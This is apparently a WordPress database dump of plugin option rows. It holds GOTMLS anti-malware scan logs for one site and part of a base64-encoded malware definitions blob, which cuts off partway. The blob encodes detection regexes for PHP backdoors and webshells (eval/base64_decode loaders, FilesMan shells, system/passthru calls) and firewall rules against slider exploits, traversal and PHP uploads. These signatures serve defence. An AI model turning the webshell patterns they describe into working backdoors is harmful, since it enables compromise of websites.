INSERT INTO `cmrfu_options` VALUES("18657","GOTMLS_scan_log/93.182.74.22/1485813581.8238","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:5:\"427px\";i:1;s:5:\"150px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:29:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";i:28;s:2:\"js\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:1:{i:0;s:4:\".git\";}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:15:\"skip_quarantine\";i:0;s:5:\"check\";a:5:{i:0;s:8:\"htaccess\";i:1;s:8:\"timthumb\";i:2;s:8:\"backdoor\";i:3;s:5:\"known\";i:4;s:9:\"potential\";}}s:4:\"scan\";a:7:{s:3:\"dir\";s:36:\"/home/srkn/ismido.com.tr/public_html\";s:5:\"start\";i:1485813620;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:2214;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1485815834.167598;s:6:\"finish\";i:1485815834;}}","yes");
INSERT INTO `cmrfu_options` VALUES("18874","GOTMLS_scan_log/78.135.9.22/1486210569.3191","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:5:\"427px\";i:1;s:5:\"150px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:29:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";i:28;s:2:\"js\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:1:{i:0;s:4:\".git\";}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:15:\"skip_quarantine\";i:0;s:5:\"check\";a:5:{i:0;s:8:\"htaccess\";i:1;s:8:\"timthumb\";i:2;s:8:\"backdoor\";i:3;s:5:\"known\";i:4;s:9:\"potential\";}}s:4:\"scan\";a:7:{s:3:\"dir\";s:36:\"/home/srkn/ismido.com.tr/public_html\";s:5:\"start\";i:1486210601;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:2126;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1486212727.1432381;s:6:\"finish\";i:1486212727;}}","yes");
INSERT INTO `cmrfu_options` VALUES("19426","_site_transient_timeout_browser_ac9d5a042b0337b3995a673b448c2450","1489823212","no");
INSERT INTO `cmrfu_options` VALUES("19427","_site_transient_browser_ac9d5a042b0337b3995a673b448c2450","a:9:{s:8:\"platform\";s:7:\"Windows\";s:4:\"name\";s:6:\"Chrome\";s:7:\"version\";s:12:\"56.0.2924.87\";s:10:\"update_url\";s:28:\"http://www.google.com/chrome\";s:7:\"img_src\";s:49:\"http://s.wordpress.org/images/browsers/chrome.png\";s:11:\"img_src_ssl\";s:48:\"https://wordpress.org/images/browsers/chrome.png\";s:15:\"current_version\";s:2:\"18\";s:7:\"upgrade\";b:0;s:8:\"insecure\";b:0;}","no");
INSERT INTO `cmrfu_options` VALUES("19403","GOTMLS_definitions_blob","YTo4OntzOjk6InBvdGVudGlhbCI7YToxNTp7czo=OiJldmFsIjthOjI6e2k6MDtzOjU6IkVBUExxIjtpOjE7czozNToiL1teYS16XC8nIl1ldmFsXChbXlwpXStbJyJcc1wpO1=rL2kiO31zOjE1OiJwcmVnX3JlcGxhY2UgL2UiO2E6Mjp7aTowO3M6NToiRzg1RjIiO2k6MTtzOjQ3OiIvcHJlZ19yZXBsYWNlXHMqXCguK1tcL1wjXHxdW2ldKmVbaV=qWyciXS4rXCkvaSI7fXM6OToiYXV=aF9wYXNzIjthOjI6e2k6MDtzOjU6IkgxTjlZIjtpOjE7czoyMToiL1wkYXV=aF9wYXNzXHMqPS4rOy9pIjt9czo=MzoiZnVuY3Rpb24gYWRkX2FjdGlvbiB3cF9lbnF1ZXVlX3NjcmlwdCBqc29uMiI7YToyOntpOjA7czo1OiJGMTE=diI7aToxO3M6MTc6Ii9qc29uMlwubWluXC5qcy9pIjt9czoxMToiVGFnZ2VkIENvZGUiO2E6Mjp7aTowO3M6NToiRTRMTUciO2k6MTtzOjI=OiIvXCMoXHcrKVwjLis_XCNcL1wxXCMvaXMiO31zOjIyOiJwcm9=ZWN=ZWQgYnkgY29weXJpZ2h=IjthOjI6e2k6MDtzOjU6IkQ4TUN3IjtpOjE7czoxMzY6Ii9cL1wqIFRoaXMgZmlsZSBpcyBwcm9=ZWN=ZWQgYnkgY29weXJpZ2h=IGxhdyBhbmQgcHJvdmlkZWQgdW5kZXIgbGljZW5zZS4gUmV2ZXJzZSBlbmdpbmVlcmluZyBvZiB=aGlzIGZpbGUgaXMgc3RyaWN=bHkgcHJvaGliaXRlZC4gXCpcLy8iO31zOjIwOiJleGVjIHN5c3RlbSBwYXNzdGhydSI7YToyOntpOjA7czo1OiJFQVBMZyI7aToxO3M6NTE6Ii88XD8uKz9leGVjXCguKz9zeXN=ZW1cKC4rP3Bhc3N=aHJ1XCguK2Z3cml=ZVwoLisvcyI7fXM6Mjk6IkV4dGVybmFsIFJlZGlyZWN=IFJld3JpdGVSdWxlIjthOjI6e2k6MDtzOjU6IkYxVUlaIjtpOjE7czo=MjoiL1Jld3JpdGVSdWxlIFteIF=rIGh=dHBcOlwvXC8oPyExMjdcLikuKi9pIjt9czozNToibm8gZXJyb3JfcmVwb3J=aW5nIGxvbmcgbGluZXMgYWxvbmUiO2E6Mjp7aTowO3M6NToiRDM1QmEiO2k6MTtzOjc5OiIvPFw_KHBocCkqW1xyXG5cdCBcQF=qZXJyb3JfcmVwb3J=aW5nXCgwXCk7Lis_W2EtejAtOVwvXC1cPSciXC5cXXsyMDAwfS4qP1w_Pi9pIjt9czoxOToiYSBzcGFuIGNvbG9yIEYxRUZFNCI7YToyOntpOjA7czo1OiJEOFJBUCI7aToxO3M6MTE4OiIvXDxhIFteXD5dK1w-XDxzcGFuIHN=eWxlPSJjb2xvclw6XCNGMUVGRTQ7Ilw-KC4rPylcPFwvc3Bhblw-XDxcL2FcPlw8c3BhbiBzdHlsZT=iY29sb3JcOlwjRjFFRkU=OyJcPiguKz8pXDxcL3NwYW5cPi9pIjt9czoxNzoiVmFyaWFibGUgRnVuY3Rpb24iO2E6Mjp7aTowO3M6NToiRTg1NkwiO2k6MTtzOjY3OiIvKDwhXGQpXCRbXCRce1=qW2EtelwtXF8wLTldK1tcfSBcdF=qKFxbW15cXV=rXF1bIFx=XSopKlwoLio_XClcOy9pIjt9czoxNToiY3JlYXRlX2Z1bmN=aW9uIjthOjI6e2k6MDtzOjU6IkcxTUZlIjtpOjE7czo3ODoiLyhcJFthLXpfMC=5XStbPVxzXEBdKyk_Y3JlYXRlX2Z1bmN=aW9uXChbXixdKyxbXHNcJFwuXFtcXWEtel8wLTldK1tcc1wpXSs7Ki9pIjt9czo=NzoiUmV3cml=ZUNvbmQgSFRUUF9VU=VSX=FHRU5UIFJld3JpdGVSdWxlIGh=dHAgSVAiO2E6Mjp7aTowO3M6NToiRjI3N2giO2k6MTtzOjg=OiIvKFJld3JpdGVDb25kIFwlXHtIVFRQX1VTRVJfQUdFTlRcfSAuK1xzKykrUmV3cml=ZVJ1bGUgXF4uKlwkIGh=dHA6XC9cLyg_ITEyN1wuKS4qL2kiO31zOjEyOiJ=aXRsZSBoYWNrZWQiO2E6Mjp7aTowO3M6NToiRzRTQWciO2k6MTtzOjE5OiIvPHRpdGxlPlxzKmhhY2tlZC9pIjt9czoyMToiZG9jdW1lbnQud3JpdGUgaWZyYW1lIjthOjI6e2k6MDtzOjU6IkgxUEFPIjtpOjE7czo1MjoiL2RvY3VtZW5=XC53cml=ZVwoKFsnIl=pPGlmcmFtZSAuKzxcL2lmcmFtZT5cMVwpOyovaSI7fX1zOjg6ImZpcmV3YWxsIjthOjM6e3M6OToiUmV2U2xpZGVyIjthOjc6e2k6MDtzOjU6IkdCS=ZyIjtpOjE7czozNjoiUmV2b2x1dGlvbiBTbGlkZXIgRXhwbG9pdCBQcm9=ZWN=aW9uIjtpOjI7czo=MTM6IlRoaXMgcHJvdGVjdGlvbiBpcyBhdXRvbWF=aWNhbGx5IGFjdGl2YXRlZCBiZWNhdXNlIG9mIHRoZSB3aWRlc3ByZWFkIGF=dGFja3Mgb24gV29yZFByZXNzIHRoYXQgaGF2ZSBhZmZlY3RlZCBzbyBtYW55IHNpdGVzLiBJdCBpcyBzdGlsbCByZWNvbW1lbmRlZCB=aGF=IHlvdSBtYWtlIHN1cmUgdG8gdXBncmFkZSBhbnkgb2xkZXIgdmVyc2lvbnMgb2YgdGhlIFJldm9sdXRpb24gU2xpZGVyIHBsdWdpbiwgZXNwZWNpYWxseSB=aG9zZSBpbmNsdWRlZCBpbiB=aGVtZXMgdGhhdCB3aWxsIG5vdCB1cGRhdGUgYXV=b21hdGljYWxseS4gRXZlbiBpZiB5b3UgZG9uJ3QgdGhpbmsgeW91IGhhdmUgUmV2b2x1dGlvbiBTbGlkZXIgb24geW91ciBzaXRlIGl=IGRvZW4ndCBodXJ=IHRvIGhhdmUgdGhpcyBwcm9=ZWN=aW9uIGVuYWJsZWQuIjtpOjM7czo2OiJTRVJWRVIiO2k6NDtzOjIwOiIvXC9hZG1pbi1hamF4XC5waHAvaSI7aTo1O3M6NzoiUkVRVUVTVCI7aTo2O3M6MTE5OiIvXCZpbWc9W15cJl=qKD88IVwucG5nKSg_PCFcLmpwZykoPzwhXC5qcGVnKSg_PCFcLmdpZikoPzwhXC5ibXApKD88IVwudGlmKSg_PCFcLnRpZmYpKD88IVwucHNkKSg_PCFcLnN2ZykoPzwhXC5pY28pXCYvaSI7fXM6OToiVHJhdmVyc2FsIjthOjU6e2k6MDtzOjU6IkdCS=M4IjtpOjE7czozMDoiRGlyZWN=b3J5IFRyYXZlcnNhbCBQcm9=ZWN=aW9uIjtpOjI7czoyMTY6IlRoaXMgcHJvdGVjdGlvbiBpcyBhdXRvbWF=aWNhbGx5IGFjdGl2YXRlZCBiZWNhdXNlIHRoaXMgdHlwZSBvZiBhdHRhY2sgaXMgcXVpdGUgY29tbW9uLiBUaGlzIHByb3RlY3Rpb24gY2FuIHByZXZlbnQgaGFja2VycyBmcm9tIGFjY2Vzc2luZyBzZWN1cmUgZmlsZXMgaW4gcGFyZW5=IGRpcmVjdG9yaWVzIChvciB1c2VyJ3MgZm9sZGVycyBvdXRzaWRlIHRoZSBzaXRlX3Jvb3QpLiI7aTozO3M6NzoiUkVRVUVTVCI7aTo=O3M6MjI6Ii89W1xzXC9dKihcLlwufGV=YylcLy8iO31zOjk6IlVwbG9hZFBIUCI7YTo1OntpOjA7czo1OiJHQ=9BVCI7aToxO3M6MjY6IlVwbG9hZCBQSFAgRmlsZSBQcm9=ZWN=aW9uIjtpOjI7czoxNzc6IlRoaXMgcHJvdGVjdGlvbiBpcyBhdXRvbWF=aWNhbGx5IGFjdGl2YXRlZCBiZWNhdXNlIHRoaXMgdHlwZSBvZiBhdHRhY2sgaXMgZXh=cmVtZWx5IGRhbmdlcm91cy4gVGhpcyBwcm9=ZWN=aW9uIGNhbiBwcmV2ZW5=IGhhY2tlcnMgZnJvbSB1cGxvYWRpbmcgbWFsaWNpb3VzIGNvZGUgdmlhIHdlYiBzY3JpcHRzLiI7aTozO3M6NToiRklMRVMiO2k6NDtzOjIwOiIvbmFtZT1bXlwmXSpcLnBocFwmLyI7fX1zOjg6ImJhY2tkb29yIjthOjg1OntzOjIxOiJzaGVsbCBzeXN=ZW=gcGFzc3RocnUiO2E6Mjp7aTowO3M6NToiRDhESjkiO2k6MTtzOjk5OiIvXDxcPyguKz8pKHNoZWxsfGF1dGhwKSguKz8pZXJyb3JfcmVwb3J=aW5nXCgwXCkoLis_KXNldF9=aW1lX2xpbWl=XCgwXCkoLis_KWluaV9zZXRcKC4rZm9wZW5cKC4rL3MiO31zOjE4OiJhdXRoX3Bhc3MgRmlsZXNNYW4iO2E6Mjp7aTowO3M6NToiSDE2R3QiO2k6MTtzOjIwNDoiLzxcP1twaFxzXStpZltcc1woXStpc3NldFxzKlwoXHMqXCRfKFJFUVVFU3xHRXxQT1MpVFxbKFsnIl=pKFthLXpfMC=5XSspXDJbXlx7XStce1xzKnN3aXRjaCBcKFwkX1wxVFxbXDJcM1wyXF=uKz9kZWZhdWx=OlteXH1dK1tcfVxzXStkaWVcKFteXH1dK1tcfVxzXStpZltcc1woXStcJHdwZGJcLT5nZXRfdmFyXCguKz9leGl=O1tcfVxzXSsoJHxcPz4pL2lzIjt9czoyNjoiR=VUZG9fcmVtb3ZlIHNhZmVfbW9kZSBlbmQiO2E6Mjp7aTowO3M6NToiQ=NVTDMiO2k6MTtzOjExNDoiL2lmXChcJF9HRVRcWydkbydcXT=9InJlbW92ZSJcKVx7XG51bmxpbmtcKGdldGN3ZFwoXClcLlwkX1NFUlZFUlxbIlNDUklQVF9OQU1FIlxdXCk7LitzYWZlX21vZGUuK2Vsc2UuKydcLlwkZW5kOy9zIjt9czo=MDoic2V=X2Vycm9yX2hhbmRsZXIgZXZhbCBmaWxlX2dldF9jb25=ZW5=cyI7YToyOntpOjA7czo1OiJGOVM5VyI7aToxO3M6MTI=OiIvKGVycm9yX3JlcG9ydGluZ1woLis_fHNldF9lcnJvcl9oYW5kbGVyXCguKz8pKmV2YWxcKFteXCldKj8oXCRyZXF1ZXN=fHN=cnJldlwoKVteXCldKj9maWxlX2dldF9jb25=ZW5=c1woJ1teJ1=rJ1tcKVxzXSs7L2lzIjt9czoyMDoiR=VUX2RsIHNhZmVfbW9kZSBlbmQiO2E6Mjp7aTowO3M6NToiRUNTRVYiO2k6MTtzOjEwMDoiLzxcP1twaFxzXStpZlwoaXNzZXRcKFwkX=dFVFxbWyciXWRsWyInXVxdXCkuKz9zYWZlX21vZGUuKz9cPz4oXHMqPFwvZGl2PlxzKjxcL2JvZHk-XHMqPFwvaHRtbD4pPy9pcyI7fXM6MTA6InVuc2V=IHNlbGYiO2E6Mjp7aTowO3M6NToiRDFNRmUiO2k6MTtzOjQ1OiIvXCRfX=ZJTEVfXz1fX=ZJTEVfXzsuK3Vuc2V=XChcJF9fRklMRV9fXCk7L3MiO31zOjIzOiJjbGVhcnN=YXRjYWNoZSBoZXJlIGRpZSI7YToyOntpOjA7czo1OiJENUVBNSI7aToxO3M6MTQyOiIvPFw_KHBocCk_WyBcdFxyXG5dKyhpZlwoaXNzZXRcKFwkX=dFVFxbWyciXVswLTlhLXpBLVpdK1snIl1cXVwpXClbIFx=XHJcbl=qXHtbIFx=XHJcbl=rKT9jbGVhcnN=YXRjYWNoZS4raGVyZTtbIFx=XHJcbl=rZGllO1tcfSBcdFxyXG5dK1w_Pi9zIjt9czoyMToia2V5c3BhdCB2aWFncmEgY2lhbGlzIjthOjI6e2k6MDtzOjU6IkQxT=4zIjtpOjE7czoxMjA6Ii9lcnJvcl9yZXBvcnRpbmdcKDBcKTtbIFx=XHJcbl=rXCRrZXlzcGF=Wz=gXHRdK2FycmF5XChbIFx=XHJcbl=qKFsnIl=odmlhZ3JhfGFtb3hpY2lsbGlufGNpYWxpcylbJyJdWyBcdFxyXG4sXSspezJ9LisvcyI7fXM6MTg6ImV2YWwgUkVRVUVTVCBhbG9uZSI7YToyOntpOjA7czo1OiJGNFBMUCI7aToxO3M6MTYyOiIvPFw_W3BoXHNdKygoXCRbYS16XF8wLTldKylccyo9XHMqXCRfKFJFUVVFU3xHRXxQT1MpVFteO1=rO1xzKik_XEA_ZXZhbChbXChccypcQF=rc3RyaXBzbGFzaGVzKT9bXChccypcQF=rKFwyfFwkXyhSRVFVRVN8R=V8UE9TKVRccyooXFtbXlxdXStcXVxzKikrKVtcKTtcc1=rXD8-L2kiO31zOjMzOiJhdXRoX3Bhc3MgRmlsZXNNYW4gc2FmZV9tb2RlIGV2YWwiO2E6Mjp7aTowO3M6NToiSDE2QlAiO2k6MTtzOjc3OiIvXDxcPyg_PS4qXCRhdXRoX3Bhc3MpKD89LipGaWxlc=1hbikoPz=uKnNhZmVfbW9kZSkoPz=uKihldmFsfG5ldHN=YXQpXCgpLisvcyI7fXM6MTg6ImV2YWwgYmFzZTY=X2RlY29kZSI7YToyOntpOjA7czo1OiJHOFVOciI7aToxO3M6MzAyOiIvKFxAPygoZXJyb3JfcmVwb3J=aW5nfGluaV8oc2V=fHJlc3RvcmUpKVwoW15cKV=qXCl8XCRbYS16XF8wLTldK1xzKj1ccypbXjtdKyk7XHMqKSooaWZbXChcc1=raXNzZXRcKFwkXyhQT1N8R=V8UkVRVUVTKVRcW1teXCldK1tcKVxzXSspPyhlY2hvXHMqKT8oKFwkW2Etel8wLTldKylccyo9XHMqXEA_YmFzZTY=X2RlY29kZVwoW147XSs7XHMqXEA_KGV2YWxcKC4qXDl8XDlccypcKFxzKlwkXyhQT1N8R=V8UkVRVUVTKVQpfFxAP2V2YWxcKFteO1=qYmFzZTY=X2RlY29kZVwoKVteXCldKlwpKztccyoocmV=dXJuW147XSo7KSovaSI7fXM6NTE6InNlc3Npb25fc3RhcnQgZXJyb3JfcmVwb3J=aW5nIHNldF9=aW1lX2xpbWl=IGZvb3RlciI7YToyOntpOjA7czo1OiJENEpNaCI7aToxO3M6MTIwOiIvXDxcP3BocFtcclxuIFx=XStzZXNzaW9uX3N=YXJ=XChcKTtbXHJcbiBcdF=rZXJyb3JfcmVwb3J=aW5nXCgwXCk7W1xyXG4gXHRdK3NldF9=aW1lX2xpbWl=XCguKz88XD8gZWNobyBcJGZvb3RlcjtcPz4vaXMiO31zOjE4OiJmdW5jdGlvbiBCU1NWIGV2YWwiO2E6Mjp7aTowO3M6NToiRDROQ=MiO2k6MTtzOjY5OiIvKFwvXCouKj9cKlwvW1xyXG4gXHRdKikqZnVuY3Rpb24gQlNTVlwoLitldmFsXChCU1NWXCguKz9bXCldK1s7XSovaXMiO31zOjIzOiJGaWxlc=1hbiBwcmVnX3JlcGxhY2UgLiI7YToyOntpOjA7czo1OiJFQ=ZIcyI7aToxO3M6MjQ2OiIvPFw_W3BoXHNdKihcL1wqLis_XCpcL1xzKikqKFwkW2EtelxfMC=5XStccyo9W147XSs7XHMqKSpcJFthLXpcXzAtOV=rXHMqPVtccyInXSpGWyInXC5cc1=qaVsiJ1wuXHNdKmxbIidcLlxzXSplWyInXC5cc1=qc1siJ1wuXHNdKk1bIidcLlxzXSphWyInXC5cc1=qblsiJ1xzXSo7KFxzKlwkW2EtelxfMC=5XStccyo9W147XSs7KSpccyooXCRbYS16XF8wLTldK3xwcmVnX3JlcGxhY2UpXChbXlwpXSpbXCk7XHNdKygkfFw_PikvaXMiO31zOjI1OiJmdW5jdGlvbiBBcnJheSBwcmludCBleGl=IjthOjI6e2k6MDtzOjU6Ikc2UzBUIjtpOjE7czo1MTU6Ii88XD9bcGhcc1=rKFwkW19cLVw-XC5hLXowLTlce1xbJyJcXVx9XStccyo9W147XSs7XHMqKSooKGZ1bmN=aW9uXHMrW2Etel8wLTldK1woLio_XClccypceyhcJFtePV=rPVxzKihbJyJdKXsyfSk_fGZvclteXHtdK1x7W15cfV=rXH=uKj98KHJldHVybnxnbG9iYWwpXHMrW147XSo7fFwkXHsuKz9cfVxzKlwoLio_XCkrO3xcJFx7Lis_XH1ccyo9XHMqYXJyYXlcKCgoW2Etel8wLTldK1woLio_XCkrLFxzKikrW2Etel8wLTldK1woLio_KT9cKSs7fGlmXHMqXCguKj9cKStccypce3xlbHNlW1xzXHtdKnxcJFtfXC1cPlwuYS16MC=5XHtcWyciXF1cfV=rXHMqPVteO1=rXF5ccypcZCtbXjtdKjt8ZXhpdFwoLio_XCkrO3woXCRce1thLXpfMC=5XStcKC4rP1wpXH=oXHMqXFtbXlxdXSpcXSspKltcc1wrXC47XH=8Pl=qKSs9KFtcLlxzXEBcJFx7XSpbYS16XzAtOVx9XSsoXCguKz9cKXxcWy4rP1xdKSlcfSo7fGZvcmVhY2guKz9ccythc1xzK1teXCldK1teXHtdK1x7KVs7XHNcfV=qKXs1MCx9KCR8XD8-KS9pIjt9czozMzoibWQ1dGFnZ2VkIGV2YWwgdmFyaWFibGUgZnVuY3Rpb25zIjthOjI6e2k6MDtzOjU6IkY5NksxIjtpOjE7czo3MjoiLygoXCRbYS16XF8wLTldKylccyo9XHMqW147XSs7XHMqKStcQD9ldmFsXChbXjtdKlwyXHMqXChbXlwpXSpbXClcc1=rOy9pIjt9czoyOToiaWYgaXNzZXQgUkVRVUVTVCBldmFsIFJFUVVFU1QiO2E6Mjp7aTowO3M6NToiRjdVRFAiO2k6MTtzOjIyOToiL2lmW1xzXChdK2lzc2V=W1xzXChdK1wkXyhSRVFVRVN8R=V8UE9TKVQoXChbXlwpXSpcKSt8XFtbXlxdXSpcXSt8XHtbXlx9XSpcfSspKlteXHtdK1tce1xzXStldmFsW1xzXChdKyhbYS16XzAtOV=rXChccyopKlwkXyhSRVFVRVN8R=V8UE9TKVQoXChbXlwpXSpcKSt8XFtbXlxdXSpcXSt8XHtbXlx9XSpcfSspKltcc1wpO1=rKChkaWV8ZXhpdHxlY2hvfHByaW5=KVteO1=qO1xzKikqXH1bO1xzXSsvaSI7fXM6MTQ6IkdMT=JBTFMgMCBldmFsIjthOjI6e2k6MDtzOjU6IkQ1OU1LIjtpOjE7czo3NjoiLyhcJChHTE9CQUxTXFtbJyJdKSpbMG9PXStbJyJcXVw9XC4gXHRdK1teO1=rO1tcclxuIFx=XSopK2V2YWxcKC4rW1wpXStbO1=qLyI7fXM6MzI6ImVycm9yX3JlcG9ydGluZyBwYXNzd29yZCBleGl=IG1lIjthOjI6e2k6MDtzOjU6IkQ1QkJrIjtpOjE7czoxNzI6Ii88XD8ocGhwKT9bXHJcbiBcdF=qZXJyb3JfcmVwb3J=aW5nXCgwXCk7W1xyXG4gXHRdKlwvXC9JZiB=aGVyZSBpcyBhbiBlcnJvciwgd2UnbGwgc2hvdyBpdCwga1w_W1xyXG4gXHRdKlwkcGFzc3dvcmRbPSBcdF=rLisgOi1cKVtcclxuIFx=XSpleGl=XChcKTtbXHJcbiBcdF=qXD8-XC5cJG1lXC4vaXMiO31zOjI4OiJwaHAgU3RhcnRpbmcgY2FsbHMgYzk5c2hleGl=IjthOjI6e2k6MDtzOjU6IkQ1REg3IjtpOjE7czoxMDY6Ii88XD8ocGhwKSpbXHJcbiBcdF=rXC9cL1N=YXJ=aW5nIGNhbGxzLitjaGRpclwoXCRsYXN=ZGlyXClbO1xyXG4gXHRdK1thLXowLTldK2V4aXRcKFwpWztcclxuIFx=XSooXD8-KSovaXMiO31zOjM1OiJpZiBpc3NldCBSRVFVRVNUIGZvcmVhY2ggYXJyYXkgZXZhbCI7YToyOntpOjA7czo1OiJHM=4wMSI7aToxO3M6MTU5OiIvaWZbXHNcKF=rKFthLXpfMC=5XStccypcKFxzKikqXCRfKFJFUVVFU3xHRXxQT1MpVFxbW15ce1=rXHtccyooXCRbYS16XzAtOV=rXHMqPVteO1=rO1xzKnwuKj9mb3JlYWNoXChhcnJheS4qPykqW1xzXEBdKihzeXN=ZW18ZXZhbClcKC4rXHMqKGV4aXRbXjtdKjtccyopKlx9L2kiO31zOjIwOiJwaHAgcGFzc3dvcmQgaGdfZXhpdCI7YToyOntpOjA7czo1OiJEOEo3ZSI7aToxO3M6NDg6Ii88XD8ocGhwKT8oXHMpK1wkcGFzc3dvcmQoLis_KWhnX2V4aXRcKFwpOyguKykvcyI7fXM6NzI6ImlmIGVtcHR5IFNFUlZFUiBIVFRQX1VTRVJfQUdFTlQgc2V=X3RpbWVfbGltaXQgbW92ZV91cGxvYWRlZF9maWxlIHJldHVybiI7YToyOntpOjA7czo1OiJHOEdCVCI7aToxO3M6MzAzOiIvKDxodG1sLio_PGJvZHk-XHMqKT88XD9bcGhdKlxzKigocHJpbnR8ZWNobylbXjtdKjtccyp8XC9cKlteXCpdKihcKlteXCpcL1=qKStcL1xzKikqaWZbXHNcKFwhXSsoXEA_aXNfdXBsb2FkZWRfZmlsZXxlbXB=eVwoXCRfU=VSVkVSXFtbIiddSFRUUF9VU=VSX=FHRU5UWyInXVxdW1wpXHNdKyguKz8pc2V=X3RpbWVfbGltaXQpLis_bW92ZV91cGxvYWRlZF9maWxlLisocmV=dXJuIFwkW2Etel8wLTldK3x=b3VjaFxzKihcL1wqLio_XCpcL1xzKikqXChbXjtdKyk7W1xzXH1dKygkfFw_Pihccyo8XC8oYm9keXxodG1sKT4pKikvaXMiO31zOjM1OiJlcnJvcl9yZXBvcnRpbmcgaW5pX3NldCB1bmxpbmsgRklMRSI7YToyOntpOjA7czo1OiJEOFZNNSI7aToxO3M6NzQ6Ii9bQF=qZXJyb3JfcmVwb3J=aW5nXCgwXCk7W1xyXG4gXHRAXSppbmlfc2V=XCguK1tAXSp1bmxpbmtcKF9fRklMRV9fXCk7L2lzIjt9czozMToicGhwIGlmIG1kNSBSRVFVRVNUIGV2YWwgUkVRVUVTVCI7YToyOntpOjA7czo1OiJFQlJOdSI7aToxO3M6MTU2OiIvPFw_W3BoXHNdKyhcJFthLXpcXzAtOV=rXHMqPVxzKi4rPztccyopKmlmXChcKG1kNVwoXCRfUkVRVUVTVFxbLis_ZXZhbFwoXCRbYS16XF8wLTldK1woXCRfUkVRVUVTVFxbLio_O1x9XH1cPz4oPGZvcm1bXj5dKig-XHMqPGlucHV=W14-XSopKz5ccyo8XC9mb3JtPik_L3MiO31zOjMzOiIvYXV=aF9wYXNzIGxvdmUgc2V=X2Vycm9yX2hhbmRsZXIiO2E6Mjp7aTowO3M6NToiREFNOXIiO2k6MTtzOjkzOiIvXDxcPyg_PS4qXCRhdXRoX3Bhc3MpKD89Lipsb3ZlTG9naW4pKD89Lipsb3Zlc2V=Y29va2llKSg_PS4qc2V=X2Vycm9yX2hhbmRsZXJcKCkuKyhcP1w-KSovaXMiO31zOjQ5OiJmdW5jdGlvbiBnemluZmxhdGUgYmFzZTY=X2RlY29kZSBmb3IgY2hyIG9yZCBldmFsIjthOjI6e2k6MDtzOjU6IkY4Vkd4IjtpOjE7czoyMjE6Ii8oZnVuY3Rpb25ccysoW2Etel8wLTldKylccypcKFxzKihcJFthLXpfMC=5XSspW1wpXHNce1=rXDNbPVxzXStnemluZmxhdGVcKGJhc2U2NF9kZWNvZGVcKC4rW1wpO1xzXSspP2Zvcltcc1woXSsuKz9ce1xzKihcJFthLXpfMC=5XSspW1wuXHNdKj1bXEBcc1=qY2hyXChbXjtdK1s7XHNcfV=rKHJldHVyblteO1=qWztcfVxzXSspP2V2YWxcKChcMlwofFw=KVteXCldKltcKVxzXSs7Ki9pIjt9czoxODoiL2Z1bmN=aW9uIHggZXZhbCB4IjthOjI6e2k6MDtzOjU6Ikc3MUM=IjtpOjE7czoxNTE6Ii8oaWZccypcKFteXHtdK1x7XHMqKT9mdW5jdGlvblxzKyhbYS16XzAtOV=rKVxzKlwoW15ce1=rXHtccyooXCRbYS16XzAtOV=rXHMqPVteO1=rO1xzKikqXEA_KGFzc2VydHxldmFsKVwoLis_XDJcKFwkXyhSRVFVRVN8R=V8UE9TKVRcWy4rP1wpO1tcc1x9XSovaXMiO31zOjExOiJpbmNsdWRlIEdFVCI7YToyOntpOjA7czo1OiJHNDdObSI7aToxO3M6MjE1OiIvW1xAXHNdKihpbmNsdWRlfHJlcXVpcmUpKF9vbmNlKT9bXHNcKF=qKFwvXCpbXlwqXSooXCpbXlwqXC9dKikrXC9ccyopKltcKFxzXSooKFsiJ1=pKFthLXpcL19cLTAtOVwuXSpcXHhbYS1mMC=5XXsyfSkrW15cNl=qP1w2fFwkXyg_IVJFUVVFU1RcWyd=YXJnZXQnXF=7KShQT1N8UkVRVUVTfEdFKVRccyooXFtbXlxdXStcXVxzKnxce1teXH1dK1x9XHMqKSspW1xzXCldKjsvaSI7fXM6MjI6ImV2YWwgYXJyYXlfcG9wIFJFUVVFU1QiO2E6Mjp7aTowO3M6NToiREJNOTUiO2k6MTtzOjYzOiIvZXZhbFwoW1x=YS16XzAtOSBcKF=qYXJyYXlfcG9wXC